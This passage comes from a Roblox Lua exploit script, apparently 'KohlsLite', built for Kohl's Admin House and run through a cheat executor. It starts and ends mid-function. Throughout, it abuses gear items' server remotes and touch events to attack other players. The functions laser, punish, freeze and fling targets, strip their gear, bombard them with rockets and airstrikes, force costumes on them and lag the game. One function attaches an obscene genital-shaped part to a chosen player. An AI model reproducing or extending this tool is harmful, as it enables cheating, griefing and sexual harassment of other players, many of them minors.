    	        Chat("gear me 22787248")
    	        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Watermelon")
        	local wat = game.Players.LocalPlayer.Backpack:FindFirstChild("Watermelon")
        	wat.Parent = game.Players.LocalPlayer.Character
	end
end

function NewW(welder, wld) -- player,cplr
	local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	Chat("gear me 22787248")
	repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Watermelon")
	local melon = game.Players.LocalPlayer.Backpack:FindFirstChild("Watermelon")
	melon.Parent = game.Players.LocalPlayer.Character
	melon.GripPos = Vector3.new(2,-0.5,1.5)
	task.wait()
	Chat("unsize me")
	Chat("stun "..welder)
	task.wait(.2)
	melon.Parent = workspace
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://178130996"
	local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim)
	k:Play()
	repeat 
		rwait()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(-1,1.5,4) 
	until wld.Character:FindFirstChild("Watermelon")
	k:Stop()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end

function HFreeze()
	local originalcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    	Chat("gear me 130113146")
	Chat("speed "..welder.." 0")
    	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    	local gun = game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
    	gun.Parent = game.Players.LocalPlayer.Character
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.Head.CFrame * CFrame.new(-1,-1,4)
	wait(.3333)
	repeat wait() 
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.Head.CFrame * CFrame.new(-1,-1,4)
	spawn(function()
	    	local Type = "Click"
		local Mode = true
		local Pos = wld.Character.Head.Position
		gun.ServerControl:InvokeServer(Type, Mode, Pos)
	end)
	until wld.Character.Head:FindFirstChildOfClass("SelectionBox")
	Chat("reset me")
	wait(0.25)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originalcf
end

function TAttach()
	Chat("speed "..welder.." 0")
	Chat("setgrav "..welder.." 3500")
	Chat("freeze "..welder)
	Chat("unfreeze "..welder)
	repeat wait() until wld.Character:FindFirstChild("ice")
	wld.Character.ice:Destroy()
	Chat("speed "..welder.." 0")
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wld.Character.HumanoidRootPart.CFrame*CFrame.new(1.5,0,0)
	wait(0.25)
	Chat("unpunish me");Chat("invis me")
end

function DumbGuy()
        Chat("speed "..dummy.." 0")
        Chat("music 131453190")
        wait(0.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = idum.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3) * CFrame.Angles(0,math.rad(180),0)
        Speak("Don't believe me?");task.wait(0.9)
        Speak("Here,");task.wait(0.6)
        Speak("I'll put you on.");task.wait(0.6)
        Chat("gear me 212641536")
        repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        boomba = game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoombox")
        boomba.Parent = game.Players.LocalPlayer.Character
        wait(1)
        boomba:Destroy()
        Speak("That's you!")
        Chat("/e point");task.wait(0.9)
        Speak("That's how dumb you sound!");task.wait(1)
        Chat("music nan")
        Chat("speed "..dummy.." 16")
end

function Laser()
	    if firetouchinterest then
		--
	    else
		Remind("Command may not work since firetouchinterest is not supported by your executor.")
	    end
	
            local goodbye = false
            local kahcon
            local kahcon2

            kahcon = workspace.ChildAdded:Connect(function(Child)
                if Child.Name == "Effect" then
                    task.spawn(function()
                        repeat task.wait() 
                            firetouchinterest(Child, laman.Character.HumanoidRootPart, 0)
                            firetouchinterest(Child, laman.Character.HumanoidRootPart, 1)
                        until Child.Parent ~= workspace or goodbye or not kahcon
                    end)
                end
            end)

            kahcon2 = laman.Character.HumanoidRootPart.ChildAdded:Connect(function(Child)
                if Child.Name == "SelectionBox" and not goodbye then
                    goodbye = true
                    Chat("punish " .. laserman)
                end
            end)

            Chat("gear me 130113146")
            repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
            local Laser = game.Players.LocalPlayer.Backpack:FindFirstChild("HyperlaserGun")
            local Server = Laser:WaitForChild("ServerControl")
            task.wait()
            Laser.Parent = game.Players.LocalPlayer.Character
            Server:InvokeServer("Click", true, laman.Character.HumanoidRootPart.Position)
            repeat task.wait() until goodbye
            kahcon:Disconnect()
            kahcon2:Disconnect()
end

function pp(puser, len)
	local part = nil
	conn = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
		if not part and v.Size == Vector3.new(1,1,len) then
			part = v
			conn:Disconnect()
		end
	end)

	Chat("part/1/1/"..tostring(len))
	repeat task.wait() until part

	Chat(prefix.."gear me painter")
	repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    	paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   	paint.Parent = game.Players.LocalPlayer.Character
	Chat(prefix.."rpaintui")

	paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{["Part"]=part,["Color"]=puser.Character.Head.Color})
	part.CanCollide = false

	Loops.penis = true
	repeat 
		rwait()
		part.CFrame = puser.Character.Torso.CFrame * CFrame.new(0,-1,len*-0.5)
		part.Velocity = Vector3.new(-30,0.5,0.5)
	until not Loops.pp or not part
	Loops.pp = false
end

function dncycle() -- 9jn said so, inspired by simplekah and kohlsnoob too
        local dntime = 7
        local decdn = 0
        while Loops.dncycle do
                task.wait(0.1)
                for i = 1,24 do
                	for i = 1,59 do
                            task.wait(0.1)
                            decdn = decdn + 1
                            Chat("time " .. dntime .. ":".. decdn)
                        end
                        decdn = decdn - 59
                        dntime = dntime + 1
                end
                dntime = 0
        end
end

function arena(plr1, plr2)
    local partIndex = 1
    local indexPosition = {
    		CFrame.new(-130,5,-55),
    		CFrame.new(-140,5,-55),
    		CFrame.new(-150,5,-55),
    		CFrame.new(-130,5,-65),
    		CFrame.new(-140,5,-65),
    		CFrame.new(-150,5,-65),
    		CFrame.new(-130,5,-75),
    		CFrame.new(-140,5,-75),
    		CFrame.new(-150,5,-75),
    		CFrame.new(-154, 8, -51),
    		CFrame.new(-126, 8, -79),
   		CFrame.new(-154, 8, -79),
    		CFrame.new(-126, 8, -51),
    		CFrame.new(-154, 9, -56, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    		CFrame.new(-154, 9, -65, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    		CFrame.new(-154, 9, -74, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    		CFrame.new(-126, 9, -56, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    		CFrame.new(-126, 9, -65, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    		CFrame.new(-126, 9, -74, 1, 0, 0, 0, 1, 0, 0, 0, 1),
    		CFrame.new(-131, 9, -79, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    		CFrame.new(-140, 9, -79, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    		CFrame.new(-149, 9, -79, 0, 0, 1, 0, 1, 0, -1, 0, 0),
   		CFrame.new(-131, 9, -51, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    		CFrame.new(-140, 9, -51, 0, 0, 1, 0, 1, 0, -1, 0, 0),
    		CFrame.new(-149, 9, -51, 0, 0, 1, 0, 1, 0, -1, 0, 0),
   }

   local origin = CFrame.new(-130, 3.7, -45)
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = origin
   task.wait(0.25)

   local basepart = Instance.new("Part",game.Players.LocalPlayer.Character)
	basepart.CFrame = CFrame.new(-140,5,-65)
	basepart.Anchored = true
	basepart.Transparency = 0.5
	basepart.Size = Vector3.new(30,2.55,30)

   local function tpplrs()
        		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(128.923386, 14, -53.6450806, 0.677816927, 3.43786546e-08, 0.735230744, 3.28579688e-08, 1, -7.70511051e-08, -0.735230744, 7.63847297e-08, 0.677816927)
        		task.wait(0.25)
			Chat("tp "..plr1.." me")
    			task.wait(0.5)
        		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(151.167755, 14, -76.1952133, -0.709251344, -1.77910238e-08, -0.704955637, -4.14884234e-08, 1, 1.65041545e-08, 0.704955637, 4.09530934e-08, -0.709251344)
      	 		task.wait(0.25)
			Chat("tp "..plr2.." me")
    end

    local Connections = {}
    Connections.arena = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(part)
    	 if part.Size == Vector3.new(10,2.5,10) or part.Size == Vector3.new(1,5,1) or part.Size == Vector3.new(1, 1, 9) then
        	local localIndex = partIndex
        	partIndex = partIndex + 1
			
        	if partIndex > 25 then 
			tpplrs() 
			Connections.arena:Disconnect() 
		end
			
        	task.spawn(function()
            		while true do 
				fwait()
			--	if isnetworkowner(part) then
               				part.Velocity = Vector3.new(-30,0,0)
                			part.CanCollide = false
               				part.CFrame = indexPosition[localIndex] 
				--else 
				--	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame
			--	end
            		end
       		 end)
    	   end
    end)

    for i = 1, 9 do
    	Chat("part/10/2.5/10")
    	task.wait(0.5)
    end

    task.wait(0.5)

    for i = 1, 4 do
   	Chat("part/1/5/1")
    	task.wait(0.5)
    end

    task.wait(0.5)

    for i = 1, 12 do
    	Chat("part/1/1/9")
   	task.wait(0.5)
    end

    task.wait()
end

function Rail()
        Chat("ff " ..railer)
        Chat("god " ..railer)
        Chat("spin " ..railer)
        SuperCMD("gear me 79446473")
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, x in ipairs(Backpack:GetChildren()) do
                x.Parent = game.Players.LocalPlayer.Character
                x:WaitForChild("Click"):FireServer(workspace[railer].Torso.Position)
        end
        task.wait(2)
        Chat("ungod " .. railer)
        Chat("unspin " .. railer)
        Chat("unff " .. railer)
        Chat("ungear me")
end

function Ungearban(plrg)
        Chat("ungear me")
        Chat("tp "..plrg.." me")
        Chat("speed "..plrg.." 0")
        task.wait(0.5)
        Chat('gear me 71037101')
        repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
        ungear = game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
        task.wait()
        ungear.Parent = game.Players.LocalPlayer.Character
        task.wait(0.5)
        game.Players.LocalPlayer.Character.DaggerOfShatteredDimensions.Remote:FireServer(Enum.KeyCode.Q)
        task.wait(0.5)
        Chat("ungear me")
        Chat("speed "..plrg.." 16")
end

function StoneMap()
        Chat("ungear me")
        task.wait(0.5)
         local stoneTool1, stoneTool2
        Chat('gear me 59190534')
        Chat('gear me 59190534')
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 2
        stoneTool1, stoneTool2 = game.Players.LocalPlayer.Backpack:GetChildren()[1], game.Players.LocalPlayer.Backpack:GetChildren()[2]
        task.wait()
        stoneTool1.Parent, stoneTool2.Parent = game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Character
        task.wait()
        task.spawn(function()
            stoneTool1.ServerControl:InvokeServer("KeyPress", {["Key"] = "x", ["Down"] = true})
        end)
        task.spawn(function()
            stoneTool2.ServerControl:InvokeServer("KeyPress", {["Key"] = "x", ["Down"] = true})
        end)
end

function Platform() -- based off pr script
    Loops.platform = true
    repeat 
	rwait()
	pcall(function()
        	if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Head then
            		if not workspace.Terrain:FindFirstChild("KL_PLATFORM") then
                		local fakepart = Instance.new("Part",workspace.Terrain)
				fakepart.Name = "KL_PLATFORM"
				fakepart.Size = Vector3.new(10,1,10)
				fakepart.Anchored = true
				fakepart.CanCollide = true
				fakepart.Color = game.Players.LocalPlayer.Character.Torso.Color
		        	fakepart.TopSurface = "Smooth"
				fakepart.BottomSurface = "Smooth"
				fakepart.Material = "SmoothPlastic"
            		else
               			local fakepart = workspace.Terrain:FindFirstChild("KL_PLATFORM")
                		fakepart.Color = game.Players.LocalPlayer.Character.Torso.Color
                		fakepart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,0.199999332,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z) * CFrame.Angles(0,math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Y),0) 
            		end
        	end
   	 end)
    until not Loops.platform
    workspace.Terrain:FindFirstChild("KL_PLATFORM"):Destroy()
end

Floating = false
floatName = randomString()
KLMOUSE = game.Players.LocalPlayer:GetMouse()

function float()
	Floating = true
	local pchar = game.Players.LocalPlayer.Character
	if pchar and not pchar:FindFirstChild(floatName) then
		task.spawn(function()
			local Float = Instance.new('Part')
			Float.Name = floatName
			Float.Parent = pchar
			Float.Transparency = 1
			Float.Size = Vector3.new(2,0.2,1.5)
			Float.Anchored = true
			local FloatValue = -3.1
			Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
			Remind('Float Enabled (Q = down & E = up)')
			
			qUp = KLMOUSE.KeyUp:Connect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue + 0.5
				end
			end)
			
			eUp = KLMOUSE.KeyUp:Connect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue - 0.5
				end
			end)
			
			qDown = KLMOUSE.KeyDown:Connect(function(KEY)
				if KEY == 'q' then
					FloatValue = FloatValue - 0.5
				end
			end)
			
			eDown = KLMOUSE.KeyDown:Connect(function(KEY)
				if KEY == 'e' then
					FloatValue = FloatValue + 0.5
				end
			end)
			
			floatDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
				FloatingFunc:Disconnect()
				Float:Destroy()
				qUp:Disconnect()
				eUp:Disconnect()
				qDown:Disconnect()
				eDown:Disconnect()
				floatDied:Disconnect()
			end)
			
			local function FloatPadLoop()
				if pchar:FindFirstChild(floatName) and getRoot(pchar) then
					Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
				else
					FloatingFunc:Disconnect()
					Float:Destroy()
					qUp:Disconnect()
					eUp:Disconnect()
					qDown:Disconnect()
					eDown:Disconnect()
					floatDied:Disconnect()
				end
			end	
			
			FloatingFunc = RunService.Heartbeat:Connect(FloatPadLoop)
		end)
	end
end

function unfloat()
	Floating = false
	local pchar = game.Players.LocalPlayer.Character
	Remind('Float Disabled')
	if pchar:FindFirstChild(floatName) then
		pchar:FindFirstChild(floatName):Destroy()
	end
	if floatDied then
		FloatingFunc:Disconnect()
		qUp:Disconnect()
		eUp:Disconnect()
		qDown:Disconnect()
		eDown:Disconnect()
		floatDied:Disconnect()
	end
end

-- By iidk!
function SpHammer()
        Remind("From ii's stupid admin!")
        Chat("gear me 10468797")
        local hammer = game.Players.LocalPlayer.Backpack:WaitForChild("BanHammer")
        local mode = "kill"

        local phrases = {"Missclick","Really","Oops","Why","That is a very bad sin","while true do end","LOLWUT","You have been spun"}

        
        game.Players.LocalPlayer.Chatted:Connect(function(msg)
	           if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'hmode' then
                                local args = string.split(msg, " ")
                                if #args == 2 then
                                        mode = args[2]
                                end
                   end
                
	           if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'hcmds' then       
                                 Remind("Check your console by doing /console in chat!")
                                 HCMDS()
                   end
        end)

        function HCMDS()

		print("- Main -")
		print("hcmds - print the commands")
		print("hmode - set the mode")

		print("- Mode -")
		print("kill - used by default")
		print("anchor - freezes the player")
		print("unanchor - unfreezes the player")
		print("nil - punishes player")
		print("nan - sets size to nan")
		print("smack - smacks the player (unequip hammer right after hitting someone with this enabled)")
		print("spin - spins the player and plays music")
		print("smite - paints player black and explodes them")
		print("fling - flings the player")
		print("label - gives them a random name")
		print("furry - rawr")
		print("fem - maid outfit")
		print("color - paints the player a random color")
		print("duck - quack quack")

		print("- Script by iiDk, ported for KohlsLite. -")

        end
        
        hammer.Handle.Touched:Connect(function(p)
	        local sound = 10730819
	        if p.Parent == game.Players.LocalPlayer.Character then return end
	        if not p.Parent:FindFirstChild("Humanoid") then return end
	        if #p.Parent.Name:split(" ")>1 then return end
                
	        if mode == "kill" then
		        Chat("kill "..p.Parent.Name)
	        end
                
	        if mode == "unanchor" then
		        sound = 12221990
		        Chat("unfreeze "..p.Parent.Name)
	        end
                
	        if mode == "anchor" then
		        sound = 12222152
		        Chat("freeze "..p.Parent.Name)
	        end
                
	        if mode == "nil" then
		        if p.Name ~= "Base" then
			        sound = 4676738150
			        Chat("punish "..p.Parent.Name)
		        end
	        end
                
	        if mode == "nan" then
		        if p.Name ~= "Base" then
			        sound = 135361652
			        Chat("size "..p.Parent.Name.." nan")
		        end
	        end
                
	        if mode == "smack" then
		        if p.Name ~= "Base" then
			        sound = 5886215922
			        Chat("speed "..p.Parent.Name.." 0")
			        Chat("tp "..p.Parent.Name.." me")
			        spawn(function()
			            wait(0.8)
			            Chat("/e point")
			            wait(0.1)
			            Chat("fling "..p.Parent.Name)
			        end)
		        end
	        end
                
	        if mode == "spin" then
	                sound = 1846368080
		        Chat("music 1846368080")
		        Chat("spin "..p.Parent.Name)
		        Chat("speed "..p.Parent.Name.." 0")
	        end
                
	        if mode == "smite" then
		        sound = 12222030
		        Chat("ff me")
		        Chat("explode "..p.Parent.Name)
		        Chat("kill "..p.Parent.Name)
		        Chat("paint "..p.Parent.Name.." Really black")
		        spawn(function()
		            wait(1)
		            Chat("unff me")
		        end)
	        end
                
	        if mode == "fling" then
		        sound = 12222046
		        Chat("fling "..p.Parent.Name)
	        end
                
	        if mode == "label" then
		        sound = 12222140
		        Chat("name "..p.Parent.Name.." "..phrases[math.random(1,#phrases)])
	        end
                
	        if mode == "furry" then
	            sound = 4821245570
	            spawn(function()
	                v = game.Players[p.Parent.Name]
                        Chat("char "..v.Name.." 18")
                        wait(0.5)
                        Chat("paint "..v.Name.." Institutional white")
                        wait()
                        Chat("hat "..v.Name.." 10563319994")
                        wait()
                        Chat("hat "..v.Name.." 12578728695")
                        wait()
                        Chat("shirt "..v.Name.." 10571467676")
                        wait()
                        Chat("pants "..v.Name.." 10571468508")
                        wait()
                        Chat("tp "..v.Name.." me")
                    end)
	        end
                
	        if mode == "fem" then
	            sound = 5064301214
	            spawn(function()
	                Chat("char "..p.Parent.Name.." 31342830")
	                v = game.Players[p.Parent.Name]
                        repeat wait() until v and v.Character and v.Character:FindFirstChild("Ultra-Fabulous Hair")
                        wait(0.3)
                        Chat("removehats "..p.Parent.Name)
                        wait()
                        Chat("paint "..p.Parent.Name.." Institutional white")
                        wait()
                        Chat("hat "..p.Parent.Name.." 7141674388")
                        wait()
                        Chat("hat "..p.Parent.Name.." 7033871971")
                        wait()
                        Chat("shirt "..p.Parent.Name.." 5933990311")
                        wait()
                        Chat("pants "..p.Parent.Name.." 7219538593")
                        wait()
                        Chat("tp "..v.Name.." me")
                    end)
	        end
                
	        if mode == "color" then
		        Chat("paint "..p.Parent.name.." "..BrickColor.Random().Name)
	        end
                
	        if mode == "duck" then
		        Chat("invisible "..p.Parent.Name)
		        Chat("hat "..p.Parent.Name.." 6532336503")
		        Chat("spin "..p.Parent.Name)
		        Chat("speed "..p.Parent.Name.." 0")
	        end
                
	        if mode == "color" then
		        Chat("music 11900833")
	        else
		        Chat("music "..tostring(sound))
	        end
                
	        repeat task.wait()  until game:GetService("Workspace").Terrain["_Game"].Folder.Sound.IsLoaded
	        task.spawn(function()
	            wait(game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength)
	            Chat("music nan")
	        end)
        end)
end

Loops = {}
Loops.rainbowmap = false
Loops.rbase = false
Loops.rfog = false
Loops.pp = false
Loops.alog = false
Loops.platform = false
Loops.dncycle = false

Connections = {}
Connections.rapidfiregun = nil
Connections.airstrike = nil
Connections.cannoning = nil

musiclog = {}

KL_FOLDER = "KohlsLite"
if writefile and readfile then
	if isfolder(KL_FOLDER) then
		-- filler
	else
		makefolder("KohlsLite")
		print("\n\n\n")
		print("Created the KohlsLite folder! You can find in your workspace.")
		local file_welcome = "KohlsLite/Welcome.txt"
		local file_text = "Thank you for using KohlsLite! If you need help, please DM me at ts2021." --
		writefile(KL_FOLDER,file_text)

-- ye this will be da new feature 
-- don't have windows pc to do it rn maybe 2025 guys
--[[

		local file_blacklist = "KohlsLite/Blacklisted.txt"
		local file_whitelist = "KohlsLite/Whitelisted.txt"
		local file_gearwhitelist = "KohlsLite/Gear whitelist.txt"

		local file_bltext = "user etc etc"
		-- this would be the new way of perm whitelist/blacklist/gearwhitelist


		writefile(KL_FOLDER, ]]
	end
end

task.spawn(function()
	while true do
		task.wait(0)
		if Loops.alog then
			if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
				musicid = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").SoundId
				if not table.find(musiclog, musicid) then
					print("The song being played is "..workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").SoundId)
                                	nmusicid = musicid:match("id=(%d+)")
					table.insert(musiclog, musicid)
					if writefile and readfile then -- dizzy momento
	    					local cd = os.date("%Y-%m-%d %H:%M:%S") -- current date
    						local logdsc = "Audio was detected at: [".. cd .. "] \n The music id was: [" .. nmusicid .. "] \n The music file was: [".. musicid .."]\n" -- alog text
   						local file = "KohlsLite/AudioLogger.txt" -- file name
    						local text = "" 
	
    						if isfile(file) then -- if the kl alog file already exists, it will make the text variable have the alog text
        						text = readfile(file)
    						end
	
    						text = text .. logdsc -- adds the new alog text to the text variable. 
   					 	writefile(file, text) -- write the text variable to the kl alog file
					end
				end
			end
			-- can't get audio from boomboxes but just use iy audio logger lol	
		end
	end
end)

function PCheck()
		t = false
       		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Backpack then
			if game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") then
				t = true
			elseif game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
				paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   				paint.Parent = game.Players.LocalPlayer.Character
				Chat(prefix.."rpaintui")
				t = true
			else
				Chat(prefix.."gear me painter")
				repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
    				paint = game.Players.LocalPlayer.Backpack:FindFirstChild("PaintBucket")
   				paint.Parent = game.Players.LocalPlayer.Character
				Chat(prefix.."rpaintui")
				t = true
			end
		end
end

function rmap()

		local RainbowValue = 0
		Loops.rainbowmap = true
    		repeat task.wait()
        			RainbowValue = RainbowValue + 1/50
    			        if RainbowValue >= 1 then
        				RainbowValue = 0
    				end

				fwait()
				PCheck()

				if Loops.rainbowmap and t then
						paintmap(Color3.fromHSV(RainbowValue,1,1).R,Color3.fromHSV(RainbowValue,1,1).G,Color3.fromHSV(RainbowValue,1,1).B)
						paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            					["Part"] = game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate,
                           					["Color"] = Color3.fromHSV(RainbowValue,1,1)
                        			})
				end		
		until not Loops.rainbowmap
		Remind("CLOSED!")
end

function rbase()

		local RainbowValue = 0
		Loops.rbase = true
    		repeat task.wait()
        			RainbowValue = RainbowValue + 1/50
    			        if RainbowValue >= 1 then
        				RainbowValue = 0
    				end

				fwait()
				PCheck()

				if Loops.rbase and t then
						paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            					["Part"] = game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate,
                           					["Color"] = Color3.fromHSV(RainbowValue,1,1)
                        			})
				end		
		until not Loops.rbase
end

function rfog(deranged)

		local RainbowValue = 0
		Loops.rfog = true
    		repeat task.wait(0.05)
        			RainbowValue = RainbowValue + 1/250
    			        if RainbowValue >= 1 then
        				RainbowValue = 0
    				end

				if game.Lighting.FogEnd ~= deranged then
            					Chat("fogend "..tostring(deranged))
        			end

				if Loops.rfog then
					Chat("fogcolor "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).R*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).G*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).B*255)))
				end		
		until not Loops.rfog
end

function paintmap(R,G,B)
	        coroutine.wrap(function()
			pcall(function()
				colorAPI.colorHouse_2({
					wallsC = {R,G,B},
					baseC = {R,G,B},
					roofC = {R,G,B},
					WANDDC = {R,G,B},
					stairsC = {R,G,B},
					floorC = {R,G,B},
					rooftsC = {R,G,B},
					chiC = {R,G,B}
				})
			end)
		end)()

		spawn(function()
				colorAPI.colorBuildingBricks_2({
					DarkStoneGrey = {R,G,B},
					DeepBlue = {R,G,B},
					NY = {R,G,B},
					IW = {R,G,B},
					LimeGreen = {R,G,B},
					MSG = {R,G,B},
					RB = {R,G,B},
					TP = {R,G,B},
					RR = {R,G,B}
				})
		end)
		
		colorAPI.colorObbyBox_2(R,G,B)
		colorAPI.colorObbyBricks_2(R,G,B)
		colorAPI.colorAdminDivs_2(R,G,B)
	        colorAPI.colorRegen_2(R,G,B)
		colorAPI.colorPads_2(R,G,B)
end

function IceMap()
        Chat('gear me 2758794374')
        repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("2019BloxyAward")
        local Bloxy = game.Players.LocalPlayer.Backpack:FindFirstChild("2019BloxyAward")
        task.wait()
        Bloxy.Parent = game.Players.LocalPlayer.Character
        task.wait()
        Remind("This will get most of the parts but not all of them!")
        for i,v in pairs(game.Workspace:GetDescendants()) do
		task.wait(0)
        	if v:IsA("BasePart") then
           		 firetouchinterest(v,Bloxy.Handle,0)
           		 firetouchinterest(v,Bloxy.Handle,1)
       		end
    	end
end

function Surround(mode)
       local fullCircle = 2 * math.pi
       local radius = 10 
       local function getXAndZPositions(angle)
                local x = math.cos(angle) * radius
                local z = math.sin(angle) * radius
                return x, z
        end
        SuperCMD("gear me 88885539")
        for i,c in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if c.Name == "Tactical Airstrike" then
                        local angle = i * (fullCircle / 50)
                        local x, z = getXAndZPositions(angle)
                        c.Parent = game.Players.LocalPlayer.Character
                        c:WaitForChild("OnMouseClick"):FireServer((workspace[surrer].HumanoidRootPart.CFrame * CFrame.new(x, 0, z)).p)
                end
        end
        if mode == "sur" then
                task.wait(1)
        else 
                task.wait(10)
        end
        Chat("ungear me")
end

function JNUKE(dj, jnu)
	    for i = 1, 5 do
            		Chat("gear me 169602103")
            end	     
            repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 5
            local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
            for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
            end
	    task.wait(0.1)
            for i = 1, 1000 do
		if dj == "default" then
                	game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(Vector3.new(math.random(-200,200), math.random(-40,40), math.random(-200,200)),Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
		else
		        game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(jnu.Character.Head.Position,Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
		end
            end
	    task.wait(10)
	    Chat("ungear me")
end

function fistdrop(Position)
	task.spawn(function()
		Chat('gear me 90718686')
		repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("ConjurorsFist")
		local fist = game.Players.LocalPlayer.Backpack:FindFirstChild("ConjurorsFist")
		fist.Parent = game.Players.LocalPlayer.Character
		task.wait(0.25)
		fist.Client.Disabled = true
		function fist.MouseLoc.OnClientInvoke()
			return Position
		end
		fist:Activate()
		wait(3.5)
		fist:Destroy()
		Chat("ungear me")
	end)
end

function RoNuke(amount, range, user)
	if user == nil then
		for i = 1, amount do
			fistdrop(Vector3.new(
				math.random(range*-1,range),
				math.random(range*-1,range),
				math.random(range*-1,range)
			))
		end
	else
		if user and user.Character and user.Character:FindFirstChild("Head") then
			fistdrop(user.Character.Head.Position)
		end
	end
end

function RNuke(amount, range)
    	     for i = 1, amount do
	             Chat("gear me 88885539")
	     end
	     task.wait(0.1)
             local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
             for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
             end
	     task.wait(0.1)
             for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then
        			pcall(function()
            				v.OnMouseClick:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.Position+Vector3.new(math.random(range*-1,range),0,math.random(range*-1,range)))
        			end)
   		 	end
	     end
end

function SKCRAZE()
 	for i = 1,50 do
            Chat("gear me 200237939")
        end
        
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 50
        
        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                v.Parent = game.Players.LocalPlayer.Character
                v:Activate()
        end
        
        conn = workspace.ChildAdded:Connect(function(mdl)
            task.wait()
            if mdl:IsA("Model") then
                mdl:WaitForChild("SkateBoardPlatform").CanCollide = false
            end
        end)

	repeat task.wait(0) until skf == false
	conn:Disconnect()
end

function lagify(plr, pln)
   	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)

    	local thepartfake = Instance.new("Part",game.Players.LocalPlayer.Character)
    	thepartfake.Anchored = true
    	thepartfake.Size = Vector3.new(100,1,100)
